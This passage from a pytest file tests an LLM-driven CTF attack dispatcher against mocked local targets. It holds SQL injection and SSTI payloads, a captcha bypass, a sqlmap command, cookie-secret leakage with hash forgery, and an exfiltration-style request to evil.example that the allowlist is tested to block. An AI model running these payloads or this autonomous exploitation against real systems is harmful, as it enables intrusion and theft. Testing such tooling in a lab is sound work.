    dispatcher.state = CTFState(target="http://ctf.local", goal="�õ�flag")

    outcome = await dispatcher._run_contact_report_chain_strategy(
        "http://ctf.local/",
        {"raw_links": [], "endpoints": ["/contact"]},
    )

    assert outcome.progress is True
    assert outcome.reason == "contact/report form submitted"
    assert any(
        action == "request"
        and method == "POST"
        and url == "http://ctf.local/contact"
        and data.get("captcha_0") == "cap-key"
        and data.get("captcha_1") == "3"
        for action, url, method, data in runtime.requests
    )
    assert any(
        item.kind == "contact_captcha_bypass" and item.value == "3"
        for item in dispatcher.state.observations
    )
    assert any(
        item.kind == "contact_report_submitted"
        and item.metadata.get("final_url") == "http://ctf.local/urlstorage"
        for item in dispatcher.state.observations
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


def test_contact_captcha_text_normalizer_prefers_math_tokens():
    assert _normalize_contact_captcha_text("8+7 =") == "8+7="
    assert _normalize_contact_captcha_text("8 × 7 ?") == "8x7"


def test_normalize_exploration_url_adds_slash_for_root_query_url():
    assert (
        _normalize_exploration_url("http://ctf.local?file=flag.php")
        == "http://ctf.local/?file=flag.php"
    )
    assert (
        _normalize_exploration_url("http://ctf.local/view.php?file=flag.php")
        == "http://ctf.local/view.php?file=flag.php"
    )


def test_contact_pow_solver_handles_trivial_hardness():
    assert _solve_contact_pow_solution("1_test") == 0


@pytest.mark.asyncio
async def test_ctf_dispatcher_uses_strategy_registry_for_auth_form_sqli(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_strategy_registry.json")
    notes_module._notes.clear()

    runtime = _DispatcherSQLiRuntime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )

    called_kinds: list[str] = []
    original_execute = dispatcher.strategy_registry.execute

    async def _wrapped_execute(kind: str, context):
        called_kinds.append(kind)
        return await original_execute(kind, context)

    monkeypatch.setattr(dispatcher.strategy_registry, "execute", _wrapped_execute)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is True
    assert "auth_form_sqli" in called_kinds
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_writes_strategy_memory_audit(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_memory_audit.json")
    notes_module._notes.clear()

    memory_store = StrategyMemoryStore(tmp_path / "strategy_memory.json")
    await memory_store.save(
        StrategyMemoryEntry(
            id="mem_seed",
            fingerprint=ChallengeFingerprint(
                tech_stack=["web"],
                auth_mechanism="form_login",
                detected_type="sqli",
                has_login_form=True,
                platform="ctf.local",
            ),
            winning_hypothesis_kinds=["auth_form_sqli"],
            failed_hypothesis_kinds=["generic_web_recon"],
            solved=True,
            metadata=StrategyMemoryEntryMetadata(created_at=1e12, manual_status="active"),
        )
    )

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.StrategyMemoryStore",
        lambda: memory_store,
    )

    runtime = _DispatcherSQLiRuntime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is True
    assert dispatcher.state is not None
    assert any(
        isinstance(item, dict) and item.get("type") == "strategy_memory_audit"
        for item in dispatcher.state.meta_reasonings
    )
    assert any(
        isinstance(item, dict) and item.get("type") == "strategy_memory_outcome_audit"
        for item in dispatcher.state.meta_reasonings
    )
    assert dispatcher.state.stop_report is not None
    assert "recommended_memory_actions" in dispatcher.state.stop_report

    entries = await memory_store.list_entries(limit=10)
    seed = next(item for item in entries if item.id == "mem_seed")
    assert seed.metadata.applied_count >= 1
    assert seed.metadata.successful_applications >= 1
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm1_fallback_triggers_after_no_progress(monkeypatch, tmp_path):
    set_notes_file(tmp_path / "notes_llm1.json")
    notes_module._notes.clear()
    runtime = _LLMExplorationRuntime()
    llm = _FakeLLM(
        [
            {
                "action_type": "http_request",
                "tool_name": "http_request",
                "rationale": "check robots for hidden path",
                "payload": {"method": "GET", "url": "http://ctf.local/robots.txt"},
                "expected_signal": "200 且 body 含 /admin",
                "next_if_fail": "switch chain",
            }
        ]
    )
    dispatcher = CTFTaskDispatcher(runtime=runtime, llm=llm)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    async def _no_progress(*args, **kwargs):
        return SimpleNamespace(progress=False, flag=None, reason="no progress")

    monkeypatch.setattr(dispatcher, "_execute_web_chain", _no_progress)

    outcome = await dispatcher._execute_chain(
        chain_name="web",
        target="http://ctf.local",
        page_features={"raw_links": [], "endpoints": []},
        hint="",
    )

    assert outcome.progress is True
    assert dispatcher.state.llm_exploration_steps >= 1
    assert runtime.requests
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm2_http_request_writes_observation(tmp_path):
    set_notes_file(tmp_path / "notes_llm2.json")
    notes_module._notes.clear()
    runtime = _LLMExplorationRuntime()
    llm = _FakeLLM(
        [
            {
                "action_type": "http_request",
                "tool_name": "http_request",
                "rationale": "read admin endpoint",
                "payload": {"method": "GET", "url": "http://ctf.local/admin"},
                "expected_signal": "200 且 body 含 admin panel",
                "next_if_fail": "switch chain",
            }
        ]
    )
    dispatcher = CTFTaskDispatcher(runtime=runtime, llm=llm)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    outcome = await dispatcher._run_llm_driven_exploration(
        dispatcher._strategy_context(
            target="http://ctf.local",
            page_features={"raw_links": [], "endpoints": []},
            hint="",
        )
    )

    assert outcome.progress is True
    assert dispatcher.state.observations
    assert dispatcher.state.llm_exploration_log[0].expected_signal_met is True
    assert dispatcher.state.llm_exploration_log[0].verifier_decision == "none"
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm4_degrades_sqlmap_to_manual_payload(tmp_path):
    set_notes_file(tmp_path / "notes_llm4.json")
    notes_module._notes.clear()
    runtime = _LLMExplorationRuntime()
    llm = _FakeLLM(
        [
            {
                "action_type": "shell",
                "tool_name": "sqlmap",
                "rationale": "probe injection with sqlmap",
                "payload": {"command": "sqlmap -u http://ctf.local/check.php?id=1"},
                "expected_signal": "body contains injectable",
                "next_if_fail": "manual payload",
            },
            {
                "action_type": "http_request",
                "tool_name": "manual_sqli_payload",
                "rationale": "manual fallback payload",
                "payload": {
                    "method": "GET",
                    "url": "http://ctf.local/check.php?username=1%27+or+1%3D1%23",
                },
                "expected_signal": "200",
                "next_if_fail": "switch chain",
            },
        ]
    )
    dispatcher = CTFTaskDispatcher(runtime=runtime, llm=llm)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    await dispatcher.capability_registry.full_check()
    dispatcher.capability_registry.capability_table["sqlmap"] = CapabilityEntry(
        tool_name="sqlmap",
        is_available=False,
        health_state="down",
        last_check_ts=0.0,
        fallback_tool="manual_sqli_payload",
        install_command="install sqlmap",
        requires_user_confirm=True,
    )

    outcome = await dispatcher._run_llm_driven_exploration(
        dispatcher._strategy_context(
            target="http://ctf.local",
            page_features={"raw_links": [], "endpoints": []},
            hint="",
        )
    )

    assert outcome.progress is True
    assert len(llm.calls) >= 2
    assert runtime.commands == []
    assert runtime.requests
    assert any(
        isinstance(item, dict) and item.get("downgrade_to") == "manual_sqli_payload"
        for item in dispatcher.state.pre_action_reasonings
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm5_respects_step_budget(monkeypatch):
    runtime = _LLMExplorationRuntime()
    llm = _FakeLLM([])
    dispatcher = CTFTaskDispatcher(runtime=runtime, llm=llm)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    dispatcher.state.llm_exploration_steps = 8

    async def _no_progress(*args, **kwargs):
        return SimpleNamespace(progress=False, flag=None, reason="no progress")

    monkeypatch.setattr(dispatcher, "_execute_web_chain", _no_progress)

    outcome = await dispatcher._execute_chain(
        chain_name="web",
        target="http://ctf.local",
        page_features={"raw_links": [], "endpoints": []},
        hint="",
    )

    assert outcome.progress is False
    assert dispatcher.state.llm_exploration_steps == 8
    assert llm.calls == []


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm7_blocks_external_domain_request(tmp_path):
    set_notes_file(tmp_path / "notes_llm7.json")
    notes_module._notes.clear()
    runtime = _LLMExplorationRuntime()
    llm = _FakeLLM(
        [
            {
                "action_type": "http_request",
                "tool_name": "http_request",
                "rationale": "call remote collector",
                "payload": {"method": "GET", "url": "http://evil.example/steal"},
                "expected_signal": "200",
                "next_if_fail": "switch chain",
            }
        ]
    )
    dispatcher = CTFTaskDispatcher(runtime=runtime, llm=llm)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    outcome = await dispatcher._run_llm_driven_exploration(
        dispatcher._strategy_context(
            target="http://ctf.local",
            page_features={"raw_links": [], "endpoints": []},
            hint="",
        )
    )

    assert outcome.progress is False
    assert runtime.requests == []
    assert dispatcher.state.weak_decision_log
    assert "allowlist" in outcome.reason
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm8_routes_flag_through_verifier(tmp_path):
    set_notes_file(tmp_path / "notes_llm8.json")
    notes_module._notes.clear()
    runtime = _LLMExplorationRuntime()
    llm = _FakeLLM(
        [
            {
                "action_type": "http_request",
                "tool_name": "http_request",
                "rationale": "read secret runtime file",
                "payload": {"method": "GET", "url": "http://ctf.local/admin/secret.txt"},
                "expected_signal": "200 且 body 含 flag",
                "next_if_fail": "switch chain",
            }
        ]
    )
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        llm=llm,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    outcome = await dispatcher._run_llm_driven_exploration(
        dispatcher._strategy_context(
            target="http://ctf.local",
            page_features={"raw_links": [], "endpoints": []},
            hint="",
        )
    )

    assert outcome.flag == "flag{llm_verified_ok}"
    assert any(
        record.value == "flag{llm_verified_ok}" for record in dispatcher.state.verified_flags
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm9_supports_project_llm_signature():
    runtime = _LLMExplorationRuntime()
    llm = _ProjectStyleLLM(
        '{"action_type":"http_request","tool_name":"http_request","rationale":"probe secret","payload":{"method":"GET","url":"http://ctf.local/admin/secret.txt"},"expected_signal":"200 and flag","next_if_fail":"switch chain"}'
    )
    dispatcher = CTFTaskDispatcher(runtime=runtime, llm=llm)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    action = await dispatcher._call_llm_for_action(
        dispatcher._strategy_context(
            target="http://ctf.local",
            page_features={"raw_links": ["/admin/secret.txt"], "endpoints": ["/admin/secret.txt"]},
            hint="",
        )
    )

    assert action is not None
    assert action["action_type"] == "http_request"
    assert action["tool_name"] == "http_request"
    assert llm.calls
    assert llm.calls[0]["task_hint"] == "ctf_planning"


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm10_surfaces_provider_unavailable_as_stop_action():
    runtime = _LLMExplorationRuntime()
    llm = _ProjectStyleLLM(
        "LLM Error: wait_for_provider_recovery: all providers unavailable",
        finish_reason="provider_unavailable",
    )
    dispatcher = CTFTaskDispatcher(runtime=runtime, llm=llm)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    action = await dispatcher._call_llm_for_action(
        dispatcher._strategy_context(
            target="http://ctf.local",
            page_features={"raw_links": [], "endpoints": []},
            hint="",
        )
    )

    assert action is not None
    assert action["action_type"] == "stop"
    assert action["tool_name"] == ""
    assert "wait_for_provider_recovery" in action["rationale"]


@pytest.mark.asyncio
async def test_ctf_dispatcher_llm11_provider_unavailable_stop_is_not_blocked_by_capability_gate():
    runtime = _LLMExplorationRuntime()
    llm = _ProjectStyleLLM(
        "LLM Error: wait_for_provider_recovery: all providers unavailable",
        finish_reason="provider_unavailable",
    )
    dispatcher = CTFTaskDispatcher(runtime=runtime, llm=llm)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    outcome = await dispatcher._run_llm_driven_exploration(
        dispatcher._strategy_context(
            target="http://ctf.local",
            page_features={"raw_links": [], "endpoints": []},
            hint="",
        )
    )

    assert outcome.progress is False
    assert "wait_for_provider_recovery" in (outcome.reason or "")
    assert dispatcher.state.llm_exploration_steps == 0


# ---------------------------------------------------------------------------
# Bug-fix regression: _derive_progress_delta with chain_outcome
# ---------------------------------------------------------------------------


def test_derive_progress_delta_returns_none_not_rejected_when_chain_made_progress(tmp_path):
    """_derive_progress_delta must not return 'rejected' when chain_outcome.progress is True.

    Previously, a uniform_failure_surface observation from *any* sub-strategy
    unconditionally produced 'rejected', which cascaded into immediate
    hypothesis exhaustion even when another sub-strategy (e.g.
    hint_chain_followup) had already made real progress in the same chain.
    """
    import pentestagent.tools.notes as _notes_mod
    from pathlib import Path as _Path
    from pentestagent.tools.notes import set_notes_file as _set_notes_file
    from types import SimpleNamespace as _NS

    _set_notes_file(_Path(tmp_path) / "notes.json")
    _notes_mod._notes.clear()
    _notes_mod._loaded_notes_file = None

    class _MinimalRuntime:
        environment = _NS(available_tools=["http_request"])
        async def browser_action(self, *a, **kw): return {"error": "no browser"}
        async def proxy_action(self, *a, **kw): return {"error": "no proxy"}
        async def start(self): pass
        async def stop(self): pass

    from pentestagent.agents.pa_agent.ctf_dispatcher import CTFTaskDispatcher, _ChainOutcome

    dispatcher = CTFTaskDispatcher(runtime=_MinimalRuntime())
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag", detected_type="web")

    before_state = dispatcher._snapshot_flag_counts()

    # Simulate a sibling sub-strategy adding a uniform_failure_surface observation
    dispatcher.state.add_observation(
        "uniform_failure_surface",
        "200:orz",
        source="ssti_via_render_parameter",
        metadata={"strategy_kind": "ssti_via_render_parameter", "reason": "ORZ"},
    )

    # Chain outcome says progress=True (e.g. hint_chain_followup read hints.txt)
    chain_outcome_with_progress = _ChainOutcome(progress=True, reason="hints.txt: md5 rule found")
    delta_progress = dispatcher._derive_progress_delta(before_state, chain_outcome=chain_outcome_with_progress)

    # When chain made progress, blocked-surface from a sibling must NOT produce "rejected"
    assert delta_progress == "none", (
        f"Expected 'none' when chain.progress=True but got '{delta_progress}'. "
        "This means a sibling sub-strategy's block signal still kills the hypothesis."
    )

    # Without chain progress (all sub-strategies failed), "rejected" is expected
    chain_outcome_no_progress = _ChainOutcome(progress=False, reason="all strategies blocked")
    delta_no_progress = dispatcher._derive_progress_delta(before_state, chain_outcome=chain_outcome_no_progress)
    assert delta_no_progress == "rejected", (
        f"Expected 'rejected' when chain.progress=False but got '{delta_no_progress}'."
    )


# ---------------------------------------------------------------------------
# Phase 7 §4: stuck-trajectory detection (P7-STOP-01 to P7-STOP-03)
# ---------------------------------------------------------------------------


def test_p7_stop_01_is_stuck_trajectory_returns_true_on_repeated_observations():
    """P7-STOP-01: same watched observation repeated ≥ 3 times → _is_stuck_trajectory True"""
    from pentestagent.agents.pa_agent.ctf_dispatcher import _is_stuck_trajectory

    state = CTFState(target="http://ctf.local", goal="拿到flag")
    # Add 3 identical http_response observations (one of the watched kinds)
    for _ in range(3):
        state.add_observation("http_response", "200:login page", source="test")

    assert _is_stuck_trajectory(state) is True


def test_p7_stop_02_stuck_trajectory_sets_stop_report_reason():
    """P7-STOP-02: when detector fires, stop_report reason is set to 'stuck_trajectory'"""
    from pentestagent.agents.pa_agent.ctf_dispatcher import _is_stuck_trajectory

    state = CTFState(target="http://ctf.local", goal="拿到flag")
    state.stop_report = {}  # type: ignore[assignment]

    # 3 identical recon_url observations trigger the detector
    for _ in range(3):
        state.add_observation("recon_url", "http://ctf.local/admin", source="test")

    assert _is_stuck_trajectory(state), "Precondition: detector should fire"

    # Inline the main-loop guard (mirrors ctf_dispatcher.py logic verbatim)
    if (
        _is_stuck_trajectory(state)
        and isinstance(state.stop_report, dict)
        and state.stop_report.get("reason") != "stuck_trajectory"
    ):
        state.stop_report = {
            **(state.stop_report or {}),
            "stuck_trajectory_detected": True,
            "reason": "stuck_trajectory",
        }

    assert state.stop_report.get("reason") == "stuck_trajectory"
    assert state.stop_report.get("stuck_trajectory_detected") is True


def test_p7_stop_03_non_repeated_observations_not_stuck():
    """P7-STOP-03: diverse watched observations don't trigger detector; static logic unchanged"""
    from pentestagent.agents.pa_agent.ctf_dispatcher import _is_stuck_trajectory

    state = CTFState(target="http://ctf.local", goal="拿到flag")
    # 6 distinct http_response observations — no key appears ≥ 3 times
    for i in range(6):
        state.add_observation("http_response", f"200:unique_page_{i}", source="test")

    assert _is_stuck_trajectory(state) is False

    # Non-watched kind never contributes even if repeated
    state2 = CTFState(target="http://ctf.local", goal="拿到flag")
    for _ in range(5):
        state2.add_observation("flag_found", "flag{x}", source="test")

    assert _is_stuck_trajectory(state2) is False


# ---------------------------------------------------------------------------
# Phase 7 §5: three-stage SSTI pipeline (P7-SSTI-01 to P7-SSTI-05)
# ---------------------------------------------------------------------------


class _SSTIProbeRuntime:
    """Minimal runtime: {{7*7}} → 49, everything else → ORZ."""

    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[str] = []

    async def browser_action(self, action: str, **kwargs):
        return {"error": "no browser"}

    async def proxy_action(self, action: str, **kwargs):
        if action != "get":
            return {"status_code": 404, "body": ""}
        url = kwargs.get("url", "")
        self.requests.append(url)
        if "%7B%7B7%2A7%7D%7D" in url or "{{7*7}}" in url or "msg=49" in url:
            return {"status_code": 200, "body": "49", "final_url": url, "redirect_history": []}
        if "/error?msg=" in url or "msg=" in url:
            return {"status_code": 200, "body": "ORZ", "final_url": url, "redirect_history": []}
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _SSTIIdentifyTornadoRuntime:
    """Runtime: {{handler.settings}} → dict with cookie_secret."""

    COOKIE_SECRET = "deadbeef-1234-5678-9abc-deadbeef1234"

    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[str] = []

    async def browser_action(self, action: str, **kwargs):
        return {"error": "no browser"}

    async def proxy_action(self, action: str, **kwargs):
        if action != "get":
            return {"status_code": 404, "body": ""}
        url = kwargs.get("url", "")
        self.requests.append(url)
        if "handler.settings%7D%7D" in url or "handler.settings}}" in url:
            body = str({"cookie_secret": self.COOKIE_SECRET, "autoreload": True})
            return {"status_code": 200, "body": body, "final_url": url, "redirect_history": []}
        if "/error?msg=" in url or "msg=" in url:
            return {"status_code": 200, "body": "ORZ", "final_url": url, "redirect_history": []}
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _SSTIJinja2Runtime:
    """Runtime that returns Jinja2-style config dump for {{config}}."""

    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[str] = []

    async def browser_action(self, action: str, **kwargs):
        return {"error": "no browser"}

    async def proxy_action(self, action: str, **kwargs):
        if action != "get":
            return {"status_code": 404, "body": ""}
        url = kwargs.get("url", "")
        self.requests.append(url)
        if "%7Bconfig%7D" in url or "{{config}}" in url or "config%7D%7D" in url:
            return {
                "status_code": 200,
                "body": "flag{jinja2_ssti_ok}",
                "final_url": url,
                "redirect_history": [],
            }
        if "/error?msg=" in url or "msg=" in url:
            return {"status_code": 200, "body": "ORZ", "final_url": url, "redirect_history": []}
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


@pytest.mark.asyncio
async def test_p7_ssti_01_probe_sends_4_payloads_and_records_ssti_probe_hit(monkeypatch, tmp_path):
    """P7-SSTI-01: ssti_probe sends 4 probe payloads; when 49 found → ssti_probe_hit recorded"""
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_ssti01.json")
    notes_module._notes.clear()

    runtime = _SSTIProbeRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    outcome = await dispatcher._run_ssti_probe_strategy(
        "http://ctf.local/",
        {"raw_links": ["http://ctf.local/error?msg=Error"]},
    )

    assert outcome.progress is True
    assert any(
        obs.kind == "ssti_probe_hit" for obs in dispatcher.state.observations
    ), "ssti_probe_hit should be recorded when '49' is in response"
    assert any(
        obs.kind == "render_ssti_response" and obs.source == "ssti_probe"
        for obs in dispatcher.state.observations
    )
    # Verify at least 4 probe requests were made (one per payload)
    probe_requests = [r for r in runtime.requests if "msg=" in r]
    assert len(probe_requests) >= 4, f"Expected ≥4 probe requests, got {len(probe_requests)}"

    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_p7_ssti_02_identify_records_tornado_engine_when_cookie_secret_found(monkeypatch, tmp_path):
    """P7-SSTI-02: ssti_identify records ssti_engine_identified=tornado when {{handler.settings}} contains cookie_secret"""
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_ssti02.json")
    notes_module._notes.clear()

    runtime = _SSTIIdentifyTornadoRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    # Pre-populate render_ssti_response to satisfy ssti_identify precondition
    dispatcher.state.add_observation(
        "render_ssti_response", "49", source="ssti_probe",
        metadata={"strategy_kind": "ssti_probe", "url": "http://ctf.local/error?msg=...", "status_code": 200},
    )

    outcome = await dispatcher._run_ssti_identify_strategy(
        "http://ctf.local/",
        {"raw_links": ["http://ctf.local/error?msg=Error"]},
    )

    assert outcome.progress is True
    engine_obs = [
        obs for obs in dispatcher.state.observations
        if obs.kind == "ssti_engine_identified"
    ]
    assert engine_obs, "ssti_engine_identified should be recorded"
    assert engine_obs[0].value == "tornado"
    # cookie_secret should also be extracted
    assert any(obs.kind == "cookie_secret_leaked" for obs in dispatcher.state.observations)
    # ssti_identify_attempted must always be added
    assert any(obs.kind == "ssti_identify_attempted" for obs in dispatcher.state.observations)

    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_p7_ssti_03_exploit_uses_tornado_path_and_hash_reconstruction(monkeypatch, tmp_path):
    """P7-SSTI-03: ssti_exploit Tornado path uses existing cookie_secret for hash reconstruction"""
    from pentestagent.agents.pa_agent.ctf_dispatcher import CTFTaskDispatcher
    import hashlib

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_ssti03.json")
    notes_module._notes.clear()

    secret = "deadbeef-1234-5678-9abc-deadbeef1234"
    flag = "flag{p7_ssti_03_ok}"

    def _filehash(filename: str) -> str:
        inner = hashlib.md5(filename.encode()).hexdigest()
        return hashlib.md5((secret + inner).encode()).hexdigest()

    class _TornadoExploitRuntime:
        def __init__(self):
            self.environment = SimpleNamespace(available_tools=[])

        async def browser_action(self, action: str, **kwargs):
            return {"error": "no browser"}

        async def proxy_action(self, action: str, **kwargs):
            if action != "get":
                return {"status_code": 404, "body": ""}
            url = kwargs.get("url", "")
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            filename = params.get("filename", [""])[0]
            filehash = params.get("filehash", [""])[0]
            if filename and filehash == _filehash(filename):
                return {
                    "status_code": 200, "body": flag,
                    "final_url": url, "redirect_history": [],
                }
            return {"status_code": 404, "body": ""}

        async def execute_command(self, command: str, timeout: int = 180):
            return SimpleNamespace(exit_code=0, stdout="", stderr="")

    runtime = _TornadoExploitRuntime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime, progress_callback=None,
        verification_callback=lambda f: "yes",
    )
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    # Pre-populate engine identification and cookie_secret (as identify stage would)
    dispatcher.state.add_observation(
        "ssti_engine_identified", "tornado", source="ssti_identify",
        metadata={"engine": "tornado"},
    )
    dispatcher.state.add_observation(
        "cookie_secret_leaked", secret, source="ssti_identify",
        metadata={"method": "handler_settings_probe"},
    )
    # Add /file endpoint for hash reconstruction
    dispatcher.state.add_observation(
        "recon_url", "http://ctf.local/file?filename=/flag.txt&filehash=x", source="test",
        metadata={},
    )

    outcome = await dispatcher._run_ssti_exploit_strategy(
        "http://ctf.local/",
        {"raw_links": ["http://ctf.local/file?filename=/flag.txt&filehash=x"]},
    )

    assert outcome.flag == flag, f"Expected flag but got: {outcome}"

    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_p7_ssti_04_exploit_takes_jinja2_path_for_jinja2_engine(monkeypatch, tmp_path):
    """P7-SSTI-04: when engine=jinja2, ssti_exploit tries {{config}} dump path"""
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_ssti04.json")
    notes_module._notes.clear()

    runtime = _SSTIJinja2Runtime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime, progress_callback=None,
        verification_callback=lambda f: "yes",
    )
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    # Pre-populate jinja2 engine identification
    dispatcher.state.add_observation(
        "ssti_engine_identified", "jinja2", source="ssti_identify",
        metadata={"engine": "jinja2"},
    )

    outcome = await dispatcher._run_ssti_exploit_strategy(
        "http://ctf.local/",
        {"raw_links": ["http://ctf.local/error?msg=Error"]},
    )

    assert outcome.flag == "flag{jinja2_ssti_ok}", (
        f"Expected Jinja2 flag from config dump but got: {outcome}"
    )

    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


def test_p7_ssti_05_old_strategies_removed_from_web_strategy_order():
    """P7-SSTI-05: ssti_via_render_parameter and tornado_ssti are NOT in _WEB_STRATEGY_ORDER"""
    # Import the dispatcher module to inspect the constant
    from pentestagent.agents.pa_agent import ctf_dispatcher as disp_module

    # The _WEB_STRATEGY_ORDER is a local variable, not accessible directly.
    # Instead, verify via the strategy_registry chain_names.
    from pentestagent.agents.pa_agent.strategy_registry import StrategyRegistry
    registry = StrategyRegistry.build_default()

    # Old strategies should still be registered (backward compat) but in "web-legacy"
    ssti_via = registry.get("ssti_via_render_parameter")
    assert ssti_via is not None
    assert ssti_via.chain_name != "web", (
        "ssti_via_render_parameter should NOT have chain_name='web' (Phase 7 migration)"
    )

    tornado = registry.get("tornado_ssti")
    assert tornado is not None
    assert tornado.chain_name != "web", (
        "tornado_ssti should NOT have chain_name='web' (Phase 7 migration)"
    )

    # New strategies should be registered with chain_name="web"
    for kind in ("ssti_probe", "ssti_identify", "ssti_exploit"):
        s = registry.get(kind)
        assert s is not None, f"Strategy '{kind}' not registered"
        assert s.chain_name == "web", f"Strategy '{kind}' should have chain_name='web'"


# ─────────────────────────────────────────────────────────────────────────────
# Phase 7 §2 — RecoveryController verbal reflection
# P7-REC-01 to P7-REC-03
# ─────────────────────────────────────────────────────────────────────────────


def test_p7_rec_01_verbal_reflection_writes_to_meta_reasonings():
    """P7-REC-01: verbal_reflection() → state.meta_reasonings 中出现 verbal_reflection 条目。"""
    from pentestagent.agents.pa_agent.recovery import RecoveryController
    from pentestagent.agents.pa_agent.hypothesis_engine import HypothesisEngine

    state = CTFState(target="http://ctf.local", goal="拿到flag")
    controller = RecoveryController(HypothesisEngine())

    result = controller.verbal_reflection(state, "flag{wrong_guess}", "source-only")

    # 返回值结构正确
    assert result["type"] == "verbal_reflection"
    assert result["wrong_flag"] == "flag{wrong_guess}"
    assert result["evidence_source"] == "source-only"
    assert "reflection" in result
    assert len(result["reflection"]) > 0

    # 写入了 meta_reasonings
    reflections = [
        e for e in state.meta_reasonings
        if isinstance(e, dict) and e.get("type") == "verbal_reflection"
    ]
    assert len(reflections) == 1
    assert reflections[0]["wrong_flag"] == "flag{wrong_guess}"


def test_p7_rec_02_verbal_reflection_content_covers_three_parts():
    """P7-REC-02: reflection ≤ 256 字符；各 evidence_source 路径产生对应关键词。"""
    from pentestagent.agents.pa_agent.recovery import RecoveryController
    from pentestagent.agents.pa_agent.hypothesis_engine import HypothesisEngine

    controller = RecoveryController(HypothesisEngine())

    # hash_reconstruction 路径 → "哈希重构"
    state_h = CTFState(target="http://ctf.local", goal="拿到flag")
    e_h = controller.verbal_reflection(state_h, "flag{bad_hash}", "hash_reconstruction")
    assert "哈希重构" in e_h["reflection"]
    assert len(e_h["reflection"]) <= 256

    # LLM 路径 → "LLM"
    state_l = CTFState(target="http://ctf.local", goal="拿到flag")
